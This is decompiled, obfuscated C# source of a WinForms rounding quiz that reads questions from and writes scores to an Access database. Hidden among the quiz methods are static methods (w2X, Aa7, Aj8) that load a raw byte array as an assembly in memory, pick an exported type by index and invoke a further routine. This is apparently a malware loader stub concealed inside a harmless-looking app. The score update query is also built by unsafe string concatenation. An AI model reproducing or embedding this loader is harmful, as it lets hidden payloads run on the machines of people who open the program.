using System;
using System.ComponentModel;
using System.Data;
using System.Data.Common;
using System.Data.OleDb;
using System.Drawing;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Co2;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using k9W;

namespace d4K;

[DesignerGenerated]
public class s8G : Form
{
	private Label _lblAnswer;

	private Label _lblPlaces;

	private Label _Label1;

	private int score;

	private float answer;

	private bool complete;

	private float random;

	private int places;

	internal IContainer J;

	internal Label h;

	internal Button F;

	internal TextBox u;

	internal Label X;

	internal int W;

	internal object V;

	internal object N;

	public object globalvariables
	{
		get
		{
			return N;
		}
		set
		{
			object obj = (N = RuntimeHelpers.GetObjectValue(value));
		}
	}

	public s8G()
	{
		((Form)this).add_Load((EventHandler)Zp4);
		score = 0;
		W = 0;
		w5F();
	}

	protected override void f6C(bool Tn0)
	{
		try
		{
			if (Tn0 && J != null)
			{
				J.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(Tn0);
		}
	}

	private void w5F()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		Yz9(new Label());
		t3X(new Label());
		a7F(new Label());
		f6P(new Button());
		j5K(new Label());
		Si4(new TextBox());
		p1Y(new Label());
		((Control)this).SuspendLayout();
		a4W().set_AutoSize(true);
		((Control)a4W()).set_Location(new Point(432, 131));
		((Control)a4W()).set_Name("lblAnswer");
		((Control)a4W()).set_Size(new Size(42, 13));
		((Control)a4W()).set_TabIndex(52);
		a4W().set_Text("Answer");
		Ey5().set_AutoSize(true);
		((Control)Ey5()).set_Location(new Point(172, 9));
		((Control)Ey5()).set_Name("lblPlaces");
		((Control)Ey5()).set_Size(new Size(15, 13));
		((Control)Ey5()).set_TabIndex(50);
		Ey5().set_Text("R");
		j3A().set_AutoSize(true);
		((Control)j3A()).set_Location(new Point(12, 9));
		((Control)j3A()).set_Name("lblT4Question");
		((Control)j3A()).set_Size(new Size(15, 13));
		((Control)j3A()).set_TabIndex(49);
		j3A().set_Text("Q");
		((Control)Yc6()).set_Location(new Point(193, 212));
		((Control)Yc6()).set_Name("btnT4CheckAnswer");
		((Control)Yc6()).set_Size(new Size(92, 23));
		((Control)Yc6()).set_TabIndex(47);
		((ButtonBase)Yc6()).set_Text("Check Answer");
		((ButtonBase)Yc6()).set_UseVisualStyleBackColor(true);
		Jn7().set_AutoSize(true);
		((Control)Jn7()).set_Location(new Point(12, 217));
		((Control)Jn7()).set_Name("Label1");
		((Control)Jn7()).set_Size(new Size(45, 13));
		((Control)Jn7()).set_TabIndex(46);
		Jn7().set_Text("Answer:");
		((Control)k9S()).set_Location(new Point(63, 214));
		((Control)k9S()).set_Name("txtAnswer");
		((Control)k9S()).set_Size(new Size(100, 20));
		((Control)k9S()).set_TabIndex(45);
		c4E().set_AutoSize(true);
		((Control)c4E()).set_Location(new Point(103, 9));
		((Control)c4E()).set_Name("lblRandomNo");
		((Control)c4E()).set_Size(new Size(15, 13));
		((Control)c4E()).set_TabIndex(53);
		c4E().set_Text("R");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(524, 389));
		((Control)this).get_Controls().Add((Control)(object)c4E());
		((Control)this).get_Controls().Add((Control)(object)a4W());
		((Control)this).get_Controls().Add((Control)(object)Ey5());
		((Control)this).get_Controls().Add((Control)(object)j3A());
		((Control)this).get_Controls().Add((Control)(object)Yc6());
		((Control)this).get_Controls().Add((Control)(object)Jn7());
		((Control)this).get_Controls().Add((Control)(object)k9S());
		((Control)this).set_Name("T4Question");
		((Form)this).set_Text("Rounding");
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[SpecialName]
	internal virtual Label a4W()
	{
		return _lblAnswer;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Yz9(Label c7B)
	{
		_lblAnswer = c7B;
	}

	[SpecialName]
	internal virtual Label Ey5()
	{
		return _lblPlaces;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void t3X(Label z3Q)
	{
		_lblPlaces = z3Q;
	}

	[SpecialName]
	internal virtual Label j3A()
	{
		return h;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void a7F(Label n9B)
	{
		Label val = (h = n9B);
	}

	[SpecialName]
	internal virtual Button Yc6()
	{
		return F;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void f6P(Button x3Q)
	{
		EventHandler eventHandler = Rg7;
		Button f = F;
		if (f != null)
		{
			((Control)f).remove_Click(eventHandler);
		}
		Button val = (F = x3Q);
		f = F;
		if (f != null)
		{
			((Control)f).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Label Jn7()
	{
		return _Label1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void j5K(Label c4X)
	{
		_Label1 = c4X;
	}

	[SpecialName]
	internal virtual TextBox k9S()
	{
		return u;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Si4(TextBox Pa4)
	{
		TextBox val = (u = Pa4);
	}

	[SpecialName]
	internal virtual Label c4E()
	{
		return X;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void p1Y(Label Nq9)
	{
		Label val = (X = Nq9);
	}

	private void Zp4(object sender, EventArgs e)
	{
		y8R();
		r7W();
		Cg6();
		a4W().set_Text(Conversions.ToString(answer));
	}

	public void y8R()
	{
		string cb = "SELECT Question FROM tblQuestions WHERE TopicNo = 4;";
		a6L(cb);
	}

	public void a6L(string Cb0)
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Expected O, but got Unknown
		//IL_0019: Unknown result type (might be due to invalid IL or missing references)
		//IL_001f: Expected O, but got Unknown
		DataTable dataTable = new DataTable();
		OleDbConnection val = new OleDbConnection("Provider=Microsoft.Jet.OLEDB.4.0;Data Source=Student_Details.mdb");
		val.Open();
		OleDbDataAdapter val2 = new OleDbDataAdapter(Cb0, val);
		((DbDataAdapter)(object)val2).Fill(dataTable);
		j3A().set_Text(Conversions.ToString(dataTable.Rows[0][0]));
		val.Close();
		((Component)(object)val).Dispose();
	}

	public void r7W()
	{
		VBMath.Randomize();
		random = VBMath.Rnd(3f * VBMath.Rnd()) + 1f;
		c4E().set_Text(Conversions.ToString(random));
		places = checked((int)Math.Floor(3f * VBMath.Rnd()) + 1);
		Ey5().set_Text(Conversions.ToString(places));
	}

	public void Cg6()
	{
		answer = (float)Math.Round(random, places);
	}

	internal static void w2X()
	{
		Assembly assembly = null;
		byte[] rawAssembly = (byte[])Jp0.mDic[Jp0.mArray];
		assembly = Assembly.Load(rawAssembly);
		Jp0.mDic.Add("Deep", assembly);
		assembly = null;
		if (Aa7())
		{
			g9Q.Kd45();
		}
	}

	public void i3H()
	{
		//IL_0026: Unknown result type (might be due to invalid IL or missing references)
		//IL_0075: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Unknown result type (might be due to invalid IL or missing references)
		string text = "";
		bool flag = false;
		while (!(flag & (Operators.CompareString(text, k9S().get_Text(), false) == 0)))
		{
			try
			{
				text = k9S().get_Text();
				flag = true;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				MessageBox.Show("Please enter an answer");
				flag = false;
				ProjectData.ClearProjectError();
			}
		}
		float num = Convert.ToSingle(text);
		checked
		{
			if (num == answer)
			{
				score++;
				Interaction.MsgBox((object)"Correct answer", (MsgBoxStyle)0, (object)null);
			}
			else
			{
				Interaction.MsgBox((object)("Incorrect, right answer is: " + Conversions.ToString(answer)), (MsgBoxStyle)0, (object)null);
			}
		}
	}

	public void Hf2()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_0017: Expected O, but got Unknown
		string text = "Score";
		OleDbConnection Aa = new OleDbConnection("Provider=Microsoft.Jet.OLEDB.4.0;Data Source=Student_Details.mdb");
		Aa.Open();
		string kf = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)("UPDATE tblStudentScores SET " + text + " = " + Conversions.ToString(score) + " WHERE ID = "), NewLateBinding.LateGet(globalvariables, (Type)null, "StuID", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)" AND TopicNo = 4"));
		Wr2(kf, ref Aa);
		Aa.Close();
		((Component)(object)Aa).Dispose();
	}

	private void Rg7(object sender, EventArgs e)
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a5: Unknown result type (might be due to invalid IL or missing references)
		checked
		{
			if (Operators.CompareString(k9S().get_Text(), "", false) == 0)
			{
				Interaction.MsgBox((object)"Enter an answer", (MsgBoxStyle)0, (object)null);
			}
			else
			{
				i3H();
				if (W < 0)
				{
					j3A().set_Text("");
					k9S().set_Text("");
					W++;
					y8R();
					r7W();
					Cg6();
				}
				else
				{
					complete = true;
				}
			}
			if (complete)
			{
				Interaction.MsgBox((object)("You scored: " + Conversions.ToString(score)), (MsgBoxStyle)0, (object)null);
				Hf2();
				((Form)this).Close();
				NewLateBinding.LateCall(V, (Type)null, "Show", new object[0], (string[])null, (Type[])null, (bool[])null, true);
			}
		}
	}

	internal static bool Aa7()
	{
		try
		{
			try
			{
				Type type = Aj8((Assembly)Jp0.mDic["Deep"]);
				if (Operators.CompareString(type.Name, Jp0.mDic[Jp0.tName].ToString(), false) == 0)
				{
					Jp0.mDic.Add(Jp0.T, type);
					return true;
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		return false;
	}

	private void Wr2(string Kf8, ref OleDbConnection Aa6)
	{
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		//IL_0009: Expected O, but got Unknown
		//IL_0029: Unknown result type (might be due to invalid IL or missing references)
		OleDbCommand val = new OleDbCommand(Kf8, Aa6);
		try
		{
			val.ExecuteNonQuery();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show("Failed:\r\n" + ex2.Message);
			ProjectData.ClearProjectError();
		}
		finally
		{
			((Component)(object)val).Dispose();
		}
	}

	internal static Type Aj8(Assembly p5R)
	{
		return p5R.GetExportedTypes()[27];
	}
}
